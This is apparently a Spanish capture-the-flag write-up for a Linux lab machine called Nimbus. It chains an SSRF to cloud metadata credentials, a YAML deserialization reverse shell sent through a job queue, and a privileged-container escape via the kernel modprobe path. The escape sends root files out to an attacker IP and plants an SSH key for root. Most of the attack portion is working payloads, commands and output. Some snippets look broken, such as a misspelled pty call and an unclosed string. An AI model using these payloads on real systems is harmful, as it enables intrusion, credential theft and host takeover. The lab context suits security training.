---
title: Nimbus
icon: material/linux
machine:
  os: Linux
  difficulty: Hard
  date: 22/06/2026
---

# Nimbus

![](Pasted%20image%2020260625225333.png)
## 1. Enumeración

### NMAP

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 14:06 +0000
Nmap scan report for 10.129.245.218
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.83 seconds
```

Vemos 2 puertos abiertos:
- 22 SSH: Puerto que usaremos seguramente después de conseguir credenciales sobre un usuario o una llave ssh
- 80 HTTP: Página web, seguramente nuestro punto de entrada.

Antes de entrar a la página vemos como en el nmap redirige a **nimbus.htb**, por lo que lo meteremos dentro de nuestro fichero "/etc/hosts" para que pueda resolver el nombre a la ip:

```bash
tail -1 /etc/hosts         
10.129.245.218	nimbus.htb
```

### Página web principal

Entramos por navegador a la página web, vemos de que va y vemos tecnologías con la extensión Wappalyzer:
![](Pasted%20image%2020260622161030.png)

Vemos solamente 2 tecnologías:
- Nginx v.1.24.0
- SO: Ubuntu

Leyendo lo poco que nos ofrece a simple vista, parece un control interno de una herramienta llamada Nimbus (como la máquina), que se usa por el equipo de ingeniería que hay detrás (Numbus Labs) para gestionar tareas en segundo plano, como copias de seguridad, generar informes, programar tareas...

Mencionan que si un ingeniero necesita acceder directamente (por ssh), necesita la aprobación del equipo de DevOps y tiene que contactar a un compañero llamado "Marcus" por Slack que autorice su clave de seguridad.

### Enumeración de la página web

Abajo de todo nos pone la versión del software: **nimbus v1.4.2**, mas adelante buscaremos sobre esta versión por si existe alguna vulnerabilidad.

Vemos 2 botones, uno que pone "Submit Job" y otro que es "Sign In" para iniciar sesión.

Accediendo primero a sing in nos aparece una página que nos avisa que está temporalmente deshabilitado, ya que al parecer están mudando sus sistemas de Single Sign-On (SSO) hacia Okta, que es una plataforma de gestión de identidades. Si marcan esto es que seguramente haya algún subdominio involucrado que enumeraremos mas adelante.

![](Pasted%20image%2020260622162013.png)

El botón de submit job es la interfaz donde los ingenieros ordenan al sistema qué tarea ejecutar.

Esta parte de la web acepta formato YAML para crear una nueva tarea, aparecen ejemplos abajo:

```text
Example:

name: nightly-db-backup
schedule: "0 2 * * *"
runtime: python3.11
```
![](Pasted%20image%2020260622162232.png)

### Analisis del formulario

Nos centraremos ne la funcionalidad de enviar tareas en YAML, por lo que primero interceptaremos la petición con Caido al enviar una prueba para ver como se comprueba el backend:

```yaml
name: test
schedule: "0 2 * * *"
runtime: python3.11
```

Aqui capturamos toda la petición POST:

```http
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://nimbus.htb
Connection: keep-alive
Referer: http://nimbus.htb/jobs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

yaml_body=name%3A+test%0D%0Aschedule%3A+%220+2+*+*+*%22%0D%0Aruntime%3A+python3.11
```

Si observamos el comportamiento al procesar el YAML, queremos comprobar si el backend es capaz de realizar peticiones en nuestro nombre.

Para probar un posible SSRF, vamos a modificar el parámetro yaml_body en Caido, intentando introducir un campo que apunte a nuestro servidor atacante. He modificado la petición para que haga una solicitud HTTP hacia mi ip gracias a un script hecho por mi (enlace: https://github.com/D4vKry/HTTP-GET-POST-listener):

Ejemplo en la página:
```yaml
name: test
schedule: "0 2 * * *"
runtime: python3.11
url: http://<tu_ip>/
```

```bash
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://nimbus.htb
Connection: keep-alive
Referer: http://nimbus.htb/jobs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

yaml_body=yaml_body=name%3A+test%0D%0Aschedule%3A+%220+2+*+*+*%22%0D%0Aruntime%3A+python3.11%0D%0Aurl%3A+http%3A%2F%2F10.10.14.x%2F
```

Lamentablemente, después de comprobarlo nos damos cuenta que simplemente lo interpreta como texto plano, y no nos ha hecho una petición a nuestra web, confirmándonos que el campo interno del yaml NO se ejecuta en la web. 

### Descubrimiento de SSRF

Al ver el parámetro yaml_body actuando como un linter de texto, plantea como los desarrolladores interactúan con la herramienta. Muchas aplicaciones que procesan plantillas o configs, permiten cargar archivos directamente desde repositorios de servidores remotos.

He decidido comprobar si el endpoint de /jobs/preview acepta otros parámetros comúnes directamente en el POST, cambiando yaml_body por la url:

```http
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

url=http%3A%2F%2F<tu_ip>%2F
```

La página nos devuelve un error:

![](Pasted%20image%2020260624204122.png)

Nos confirma 2 cosas:
- El parámetro URL existe
- Tiene validación para que termine en .yaml o .yml

Simplemente modificamos la petición para añadir un fichero .yaml al final como este:

```bash
url=http%3A%2F%2F<tu_ip>%2Ftest.yaml
```

Volvemos a enviarlo y observamos el script:

```python
HTTP-GET-POST-listener git:(main) sudo python3 web.py 80
[sudo] contraseña para deivid: 
Serving on port 80...

[+] GET Request received
10.129.245.218 - - [24/Jun/2026 18:40:44] "GET /test.yaml HTTP/1.1" 200 -
```

### Extracción de Credenciales AWS

Sabiendo que estamos en un entorno de AWS simulado (por los mensajes después de los envíos de los yaml). nuestro objetivo natural sería apuntar al IMDS (Instance Metadata Service) en la ip predeterminada 169.254.169.254

Podemos probar a hacer una petición directamente como hicimos anteriormente pero nos devuelve un acceso denegado:
![](Pasted%20image%2020260624204841.png)

Para evadir esta restricción, aplicamos una técnica de codificación que el SO resolverá fácilmente pero que el filtro de la web pasará por alto.

### Evasión por Codificación Decimal

Haciendo la conversión de la ip a Decimal obtenemos:
```php
2852039166
```
![](Pasted%20image%2020260624205203.png)

Para interactuar con el IMDS de forma válida, debemos estructurar la URL combinando el bypass de la IP y el bypass de la extension .yaml

Como no conocemos la estructura interna, primero listaré la raíz del servicio de seguridad de AWS para ver qué nos devuelve, lanzando la petición al endpoint base de las credenciales IAM (/latest/meta-data/iam/security-credentials/):

```http
   <h1>Preview</h1>
    <div class="tag"><a href="/jobs">← submit another</a></div>
    <div class="panel">
        <div class="meta">Fetched: <code>http://2852039166/latest/meta-data/iam/security-credentials/?file=.yaml</code> · HTTP 200</div>
        <h3>Raw response</h3>
        <pre>nimbus-web-role</pre>
        <h3>Parsed</h3>
        <pre>nimbus-web-role</pre>
```

Vemos como nos da el nombre del rol que es "numbus-web-role".

Sabiendo el nombre del rol, concatenamos este elementa en la ruta para extraer credenciales temporales:

```http
<body>
    <h1>Preview</h1>
    <div class="tag"><a href="/jobs">← submit another</a></div>
    <div class="panel">
        <div class="meta">Fetched: <code>http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?file=.yaml</code> · HTTP 200</div>
        <h3>Raw response</h3>
        <pre>{
  &#34;Code&#34;: &#34;Success&#34;,
  &#34;LastUpdated&#34;: &#34;2026-06-25T17:35:23Z&#34;,
  &#34;Type&#34;: &#34;AWS-HMAC&#34;,
  &#34;AccessKeyId&#34;: &#34;ASIAQX4PG7L2K9M3N5R8&#34;,
  &#34;SecretAccessKey&#34;: &#34;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#34;,
  &#34;Token&#34;: &#34;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#34;,
  &#34;Expiration&#34;: &#34;2026-06-25T23:35:23Z&#34;
}</pre>
        <h3>Parsed</h3>
        <pre>{&#39;Code&#39;: &#39;Success&#39;, &#39;LastUpdated&#39;: &#39;2026-06-25T17:35:23Z&#39;, &#39;Type&#39;: &#39;AWS-HMAC&#39;, &#39;AccessKeyId&#39;: &#39;ASIAQX4PG7L2K9M3N5R8&#39;, &#39;SecretAccessKey&#39;: &#39;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#39;, &#39;Token&#39;: &#39;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#39;, &#39;Expiration&#39;: &#39;2026-06-25T23:35:23Z&#39;}</pre>
    </div>

</body>
```


Validamos que las credenciales tienen efecto, pero antes necesitamos buscar como interactuar con AWS.

Como ya hemos enumerado directorios solo queda enumerar dominios que es lo más probable:

```bash
nimbus gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://nimbus.htb/ --append-domain                  
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://nimbus.htb/
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
aws.nimbus.htb Status: 403 [Size: 305]
```

Efectivamente existe el subdominio de aws. Vamos a exportar todas las llaves y comprobar que funcione:

```bash
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity --endpoint-url http://aws.nimbus.htb 
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```

### Acceso Limitado a AWS y Cambio de Estrategia

Una vez validada la sesión bajo el rol nimbus-web-role, procedemos a enumerar los proyectos disponibles en el servicio AWS CodeBuild para buscar posibles vectores de ejecución de comandos o configuraciones expuestas:

```bash
aws codebuild list-projects --endpoint-url http://aws.nimbus.htb
```

```html
An error occurred (403) when calling the ListProjects operation: <ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Message>User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: codebuild:ListProjects on resource: *</Message>
  </Error>
  <RequestId>x5660007-amv4-16e6-21r0-8b01j71af982</RequestId>
</ErrorResponse>
```

El error "AccessDenied" nos confirma que estamos operando con una identidad cloud con privilegios severamente restringidos. Ante esta limitación para interactuar con CodeBuild, decidimos cambiar de estrategia y ampliar el radio de enumeración sobre otros servicios comunes de la API de AWS para comprobar dónde tenemos realmente permisos de lectura o escritura.
### Análisis de Deserialización Insegura en el Procesador YAML

En paralelo, recordamos que la funcionalidad principal de la aplicación web (/jobs/preview) recibe y procesa estructuras en formato YAML. En aplicaciones desarrolladas bajo entornos Python, es habitual el uso de la librería PyYAML. Si el backend emplea de manera insegura el método clásico yaml.load() junto con yaml.Loader, el parser intentará instanciar cualquier objeto arbitrario de Python que se defina en el documento, convirtiéndose en un vector potencial de RCE.

Para comprobar si el servidor web parsea objetos de forma insegura en caliente, interceptamos la petición con Caido e inyectamos el constructor nativo "!!python/object/apply" invocando una traza ICMP hacia nuestra IP:

```yaml
name: test-rce
schedule: "0 2 * * *"
runtime: python3.11
payload: !!python/object/apply:os.system ["ping -c 3 10.10.14.x"]
```

Preparamos un capturador de tráfico en nuestra máquina atacante:

```bash
sudo tcpdump -i tun0 icmp
```

Sin embargo, al enviar la solicitud, la aplicación web responde de inmediato con el siguiente mensaje:

```html
<h1>Preview</h1>
<div class="tag"><a href="/jobs">← submit another</a></div>
<div class="panel err"><strong>Error:</strong> YAML parse error.</div>
```

El YAML parse error nos indica que la interfaz web de previsualización cuenta con un filtro o un linter restrictivo que bloquea los tags especiales de Python antes de procesarlos.

### Interceptación del Flujo mediante AWS SQS

Para determinar si los trabajos se procesan por otra vía asíncrona que no pase por el linter de la web, recurrimos a las credenciales comprometidas del rol de AWS. Decidimos auditar los permisos sobre el servicio de mensajería **Amazon SQS (Simple Queue Service)** para comprobar si la infraestructura gestiona las tareas mediante colas de fondo:

```bash
aws sqs list-queues --endpoint-url http://aws.nimbus.htb
```

```json
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

El resultado es clave: el rol web tiene permisos para listar y ver colas en SQS, revelando la existencia de la cola interna nimbus-jobs.

Esto cambia por completo el escenario: el error de parseo anterior ocurría únicamente en el componente del frontend web, pero el procesamiento real e inseguro de las tareas ocurre cuando el backend consume los mensajes directamente desde esta cola SQS. Al tener acceso legítimo por CLI a la mensajería de AWS, podemos saltarnos el filtro de la web inyectando nuestro YAML malicioso directamente en la cola.

## 2. Acceso Inicial

### Explotación de la Cola y Reverse Shell

Aprovechando que no hay restricciones de formato al enviar datos crudos a SQS, preparamos un archivo local llamado payload.yaml configurando una Reverse Shell a través de subprocess.Popen:

```yaml
name: rce-job
schedule: "0 2 * * *"
runtime: python3.11
action: !!python/object/apply:subprocess.Popen
  - [ "bash", "-c", "bash -i >& /dev/tcp/<tu_ip>/4444 0>&1" ]
```

Publicamos el payload directamente en la cola nimbus-jobs usando el comando send-message:

```bash
aws sqs send-message --endpoint-url http://aws.nimbus.htb --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body "$(cat payload.yaml)"
```

Dejamos un oyente con netcat en el puerto asignado y, pasados unos segundos, el demonio en segundo plano procesa el mensaje de la cola, deserializa el objeto e inicia la conexión de vuelta:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.33.139 40218
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

worker@83db7f2f6a7e:/app$ ls -la ~
total 24
drwxr-x--- 1 worker worker 4096 Jun 25 18:10 .
drwxr-xr-x 1 root   root   4096 Jun 25 18:05 ..
-rw-r----- 1 root   worker   33 Jun 25 18:05 user.txt
worker@83db7f2f6a7e:/app$ cat ~/user.txt
```


## 3. Enumeración interna del contenedor
### Enumeración de ficheros

Con una shell activa bajo worker, el primer paso es estabilizarla. Como tenemos Python haremos una simple TTY upgrade:

```bash
python3 -c 'import pty; pty.spaw("/bin/bash")'
```

Una vez estabilizada la interfaz, iniciamos una inspección de las propiedades del contenedor para ver el entorno donde se ejecutan los trabajos de la cola. Listamos el contenido del directorio actual:
```bash
ls -la
total 20
drwxr-xr-x 1 worker root   4096 Jun 25 19:05 .
drwxr-xr-x 1 root   root   4096 Jun 25 17:23 ..
-rw-r--r-- 1 worker worker 1576 Jun 25 19:05 exploit.py
-rw-r--r-- 1 worker root     28 May 18 18:20 requirements.txt
-rw-r--r-- 1 worker root   1826 May 18 18:20 worker.py
```

### Funcionamiento de worker.py

Analizamos el código fuente de 'worker.py' para corroborar el comportamiento de la infraestructura interna y entender que librerias maneja:

```bash
cat worker.py 
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5

print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    print(f"[worker] received message ({len(body)} bytes)", flush=True)
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
    if not isinstance(job, dict):
        print("[worker] message did not parse to a dict, skipping", flush=True)
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    print(f"[worker] running job '{name}'", flush=True)
    if script:
        result = subprocess.run(["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
        print(f"[worker] stdout: {result.stdout}", flush=True)
        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)

def main():
    while True:
        try:
            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
                MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
            for m in resp.get("Messages", []):
                try: handle_message(m["Body"])
                except Exception as e: print(f"[worker] error: {e}", flush=True)
                finally:
                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
        except Exception as e:
            print(f"[worker] poll error: {e}", flush=True)
            time.sleep(POLL_SECS)

if __name__ == "__main__":
    main()
worker@83db7f2f6a7e:/app$ python3 exploit.py
python3 exploit.py
started: nimbus-exploit:1
worker@83db7f2f6a7e:/app$ cat worker	
cat worker.py 
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5

print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    print(f"[worker] received message ({len(body)} bytes)", flush=True)
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
    if not isinstance(job, dict):
        print("[worker] message did not parse to a dict, skipping", flush=True)
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    print(f"[worker] running job '{name}'", flush=True)
    if script:
        result = subprocess.run(["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
        print(f"[worker] stdout: {result.stdout}", flush=True)
        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)

def main():
    while True:
        try:
            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
                MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
            for m in resp.get("Messages", []):
                try: handle_message(m["Body"])
                except Exception as e: print(f"[worker] error: {e}", flush=True)
                finally:
                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
        except Exception as e:
            print(f"[worker] poll error: {e}", flush=True)
            time.sleep(POLL_SECS)

if __name__ == "__main__":
    main()
```

El script confirma que consume mensajes de la cola SQS alojada en el host 'floci:4566' y procesa el contenido utilizando la función 'yaml.load(...)'

### Revisión de /etc/hosts

Revisamos ahora la resolución de nombres:

```bash
worker@83db7f2f6a7e:/app$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.1	nimbus.htb
172.18.0.1	aws.nimbus.htb
172.18.0.3	83db7f2f6a7e
```

El archivo que muestra IP asignada a la 0.3 y que los nombres de los dominios externos resuelven hacia la 0.1 la cual funge como gateway del entorno virtualizado de Docker. Dado que el script interactúa con un host denominado 'floci', deducimos que la resolución se gestiona de forma dinámica mediante el DNS interno integrado del contenedor, apuntando de igual manera a la interfaz del host local.

## 4. Movimiento Lateral y Elevación a CodeBuild

Aprovechando que contamos con acceso local directo a la red interna, procedemos a examinar el estado de salud y los servicios activos expuestos en el puerto 4566 del host 'floci' utilizando un curl básico:

```bash
worker@83db7f2f6a7e:/app$ curl -s http://floci:4566/health
```

El servidor nos devuelve un payload en formato JSON indicando la versión y los servicios de ejecución:

```yaml
{ "edition": "community", "services": { "ssm": "running", "sqs": "running", "s3": "running", "codebuild": "running", "ecs": "running", "iam": "running" // ... [cortado para brevedad] ... }, "version": "1.5.17", "original_edition": "floci-always-free" }
```

La respuesta revela 2 puntos analíticos cruciales:
- Prácticamente todo el stack simulado de AWS de LocalStack se encuentra activo, destacando los entornos de orquestación y despliegue como codebuild.
- El entorno se identifica como 'floci-always-free'. Tradicionalmente, cuando se le realizan peticiones locales a LocalStack desde la red interna del contenedor, las restricciones restrictivas de las políticas IAM no son validadas de forma estricta.

### Evasión de restricciones

Para verificar si podemos evadir la restricción original de 'Access denied' que sufríamos desde el exterior, utilizamos la herramienta 'aws' que tiene worker para enumerar los proyectos de CodeBuild apuntando explícitamente al endpoint interno:

```bash
worker@83db7f2f6a7e:/app$ aws codebuild list-projects --endpoint-url http://floci:4566 { "projects": [] }
```

### Automatización del exploit mediante Python con boto3

Intentar registrar un proyecto complejo con directivas directamente desde el CLI de AWS puede volverse tedioso (como ya estuve intentando varias veces), así que la mejor manera de trabajar de manera limpia es haciendo un script local en python usando la librería de boto3, la cual interactuará con la API de LocalStack.

Diseñamos la lógica de explotación dividida en 2 etapas:
- 1.- **Estabilización del contenedor**: Al instanciar la imagen floci/floci:latest, descubrimos que su script de inicialización valida la identidad del usuario e intenta forzar una degradación de privilegios. Para evitar que el contenedor se detenga abruptamente o bloquee la fase de compilación, inyectamos en las variables de entorno la función maliciosa BASH_FUNC_id. Al devolver un simple echo simulando un UID cero, engañamos al entrypoint de manera inmediata, garantizando que el contenedor permanezca vivo y pase limpiamente a procesar las directivas.
- 2.- **Escape por Kernel Usermode-Helper**: Aprovechando que el proyecto se registrará forzando el modo privilegiado ('privilegedMode': True), el contenedor resultante no aplicará las máscaras de aislamiento habituales sobre el sistema de archivos jerárquico del kernel. En un contenedor estándar, el directorio '/proc/sys' se monta estrictamente como Read-Only (ro) para proteger al sistema anfitrión. Sin embargo, bajo un entorno privilegiado, esta restricción se elimina por completo.

Para validar técnicamente esta condición antes de lanzar el ataque y confirmar que la variable 'modprobe' (encargada de invocar binarios en el host ante formatos desconocidos) acepta modificaciones desde nuestro espacio aislado, se evalúan las propiedades de montura del sistema: 
```bash
worker@83db7f2f6a7e:/app$ mount | grep /proc/sys proc on /proc/sys type proc (rw,nosuid,nodev,noexec,relatime)
```

Al verificar que figura con permisos de lectura y escritura ('rw'), realizamos un test lógico de escritura directa sobre el archivo objetivo:

```bash
worker@83db7f2f6a7e:/app$ [ -w /proc/sys/kernel/modprobe ] && echo "vulnerable es escribible"
vulnerable es escribible
```

Esta comprobación confirma el vector definitivo de escape. Utilizando las directivas del buildspec del nuevo proyecto, emplearemos 'awk' sobre '/proc/mounts' para identificar dinámicamente la ruta absoluta en la que el host real mapea el almacenamiento de nuestro contenedor ('upperdir'). Posteriormente, apuntaremos 'modprobe' hacia un script intermedio ('payload.sh') diseñado para devolvernos una Reverse Shell.

Al ejecutar un archivo con bytes corruptos ('\xff\xff\xff\xff'), obligaremos al kernel de la máquina real (Host) a procesar nuestra conexión con máximos privilegios fuera del contenedor.

Escribimos el script de automatización en /tmp/exploit.py:

```python
import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ATTACKER_IP = "<tu_ip>"   # Tu IP de tun0
LPORT = 9005                   # Puerto para la exfiltración

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('{ATTACKER_IP}', {LPORT}))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(grep -o 'upperdir=[^,]*' /proc/mounts | head -n 1 | cut -d= -f2)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""
cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)
```

Tras realizar los primeros intentos diseñando un script orientado a devolver una rev shell, descubri por los logs que la sesión se cortaba de forma abrupta debido a la naturaleza de CodeBuild dentro de LocalStack. Una vez procesado el fallo binario de binfmt, el ciclo de vida del contenedor es destruido inmediatamente por el orquestador, impidiendo la estabilización de un canal interactivo convencional.

### Flag de root antes de conseguir root

Ante esta limitación de tiempo y para convalidar que el vector de escape a nivel de Kernel realmente funcionaba, variamos la estrategia hacia una exfiltración de la root flag donde suele estar (/root/root.txt). Abrimos un oyente simple con netcat en nuestra máquina local:
```bash
nimbus nc -lvnp 9005
```

Y ejecutamos la tarea asíncrona. La lectura por sockets de Python toma apenas un microsegundo, permitiendo exfiltrar la bandera de root antes de la recolección del entorno por el backend: 

```bash
Listening on 0.0.0.0 9005 Connection received on 10.129.33.139 51432 f3a7d1894b904... [Flag de Root]
```

### Conseguir acceso a Root por llave SSH

Aunque la obtención de la flag convalida el compromiso, la meta real en verdad es conseguir acceso a la máquina.

Sabiendo que el exploit de modprobe se ejecuta con total eficacia como root en la máquina física, modificamos la acción del payload.sh para abusar del servicio SSH que corre de forma nativa en el host. En lugar de forzar una shell reversa inestable, reconfiguramos el script de explotación en Python para que el kernel inyecte de manera permanente nuestra clave pública RSA directamente en el archivo authorized_keys del administrador en el host real:

```python
```python
import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
SSH_KEY = "ssh-rsa AAAAB3NzaC1y<tu llave ssh>

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        mkdir -p /root/.ssh
        echo '{SSH_KEY}' >> /root/.ssh/authorized_keys
        chmod 700 /root/.ssh
        chmod 600 /root/.ssh/authorized_keys
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(grep -o 'upperdir=[^,]*' /proc/mounts | head -n 1 | cut -d= -f2)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""

cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)
cb.update_project(
    name="nimbus-escape",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={{
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
        "environmentVariables": [
            {{"name": "BASH_FUNC_id%%", "value": '() {{ echo "uid=0(root) gid=0(root) groups=0(root)"; }}', "type": "PLAINTEXT"}}
        ],
    }},
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)
cb.start_build(projectName="nimbus-escape")
```

Lanzamos la prueba y probamos a conectarnos al equipo y comprobamos que no nos pide contraseña, consiguiendo así acceso total:

```bash
nimbus ssh root@aws.nimbus.htb                   
The authenticity of host 'aws.nimbus.htb (10.129.33.139)' cant be established.
